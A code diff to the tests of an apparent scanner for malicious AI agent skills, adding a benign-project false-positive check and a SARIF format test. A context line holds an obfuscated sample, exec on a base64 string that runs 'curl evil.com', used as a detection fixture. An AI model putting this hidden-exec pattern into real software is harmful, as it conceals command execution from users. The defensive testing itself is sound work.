@@ -48,6 +48,45 @@ def test_prompt_injection_in_md():
         report = json.loads((Path(tmp)/"r.json").read_text())
         assert any(f["type"] == "prompt_injection_risk" for f in report["findings"])
 
+
+def test_benign_project_is_quiet():
+    """A benign module + README + pyproject must not generate noise.
+
+    Regression guard for the false-positive work: documentation and packaging
+    metadata are prose (not scanned with code heuristics), benign URLs to common
+    hosts are allowlisted, and ordinary code contains no exfiltration markers.
+    """
+    app = (
+        '"""A small, ordinary utility module."""\n'
+        "import json\n"
+        "from pathlib import Path\n\n"
+        "def load_config(path: Path) -> dict:\n"
+        "    return json.loads(path.read_text())\n"
+    )
+    readme = (
+        "# sample-app\n"
+        "See https://github.com/example/sample-app and "
+        "https://pypi.org/project/sample-app for docs.\n"
+    )
+    pyproject = (
+        "[project]\n"
+        'name = "sample-app"\n'
+        'description = "A small utility for summarizing config data."\n'
+    )
+    with tempfile.TemporaryDirectory() as tmp:
+        (Path(tmp) / "app.py").write_text(app)
+        (Path(tmp) / "README.md").write_text(readme)
+        (Path(tmp) / "pyproject.toml").write_text(pyproject)
+        result = subprocess.run(
+            [sys.executable, str(Path(__file__).parent.parent / "scanner.py"),
+             "--path", str(tmp), "--output", str(Path(tmp)/"r.json")],
+            capture_output=True, text=True
+        )
+        assert result.returncode == 0
+        report = json.loads((Path(tmp)/"r.json").read_text())
+        assert report["high_severity"] == 0, report["findings"]
+        assert report["medium_severity"] == 0, report["findings"]
+
 def test_high_entropy_obfuscation():
     """High entropy base64-like string should be flagged."""
     obf = 'exec(base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgZXZpbC5jb20nKQ=="))'
@@ -62,6 +101,30 @@ def test_high_entropy_obfuscation():
         assert result.returncode == 0
         report = json.loads((Path(tmp)/"r.json").read_text())
         assert any(f["type"] == "high_entropy_obfuscation" for f in report["findings"])
+
+def test_sarif_output_is_valid():
+    """--format sarif must emit well-formed SARIF 2.1.0 for code scanning."""
+    malicious_path = Path(__file__).parent / "malicious_skill.py"
+    with tempfile.TemporaryDirectory() as tmp:
+        out = Path(tmp) / "out.sarif"
+        result = subprocess.run(
+            [sys.executable, str(Path(__file__).parent.parent / "scanner.py"),
+             "--path", str(malicious_path), "--format", "sarif", "--output", str(out)],
+            capture_output=True, text=True
+        )
+        assert result.returncode == 0, result.stderr
+        sarif = json.loads(out.read_text())
+        assert sarif["version"] == "2.1.0"
+        run = sarif["runs"][0]
+        assert run["tool"]["driver"]["name"] == "ai-skill-scanner"
+        assert run["results"], "expected results for the malicious fixture"
+        for r in run["results"]:
+            assert r["ruleId"]
+            assert r["level"] in {"error", "warning", "note"}
+            loc = r["locations"][0]["physicalLocation"]
+            assert not loc["artifactLocation"]["uri"].startswith("/")  # relative
+            assert loc["region"]["startLine"] >= 1
+
 
 def test_malicious_skill_fixture():
     """Scan the dedicated malicious_skill.py fixture.
